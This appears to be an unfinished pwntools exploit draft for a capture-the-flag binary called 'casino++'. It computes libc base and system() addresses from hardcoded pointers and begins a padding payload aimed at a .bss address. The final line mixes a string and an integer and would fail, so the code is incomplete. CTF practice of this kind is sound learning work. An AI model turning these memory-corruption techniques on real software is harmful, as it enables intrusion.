from pwn import *
#p = remote("edu-ctf.csie.org" , 10172)
print 'hello'
l = ELF('./casino++')

#print '/bin/sh -> ', hex(l.search('/bin/sh').next())

print 'a'*256
lib0 = 0x7ffff7dd0760 - 0x3ec760
lib = 0x7ffff7af4070 - 0x110070
system = lib + 0x4f440
print hex(lib), hex(lib0), hex(system)

bss = 0x601ff0
name = flat('a' * 16 + bss)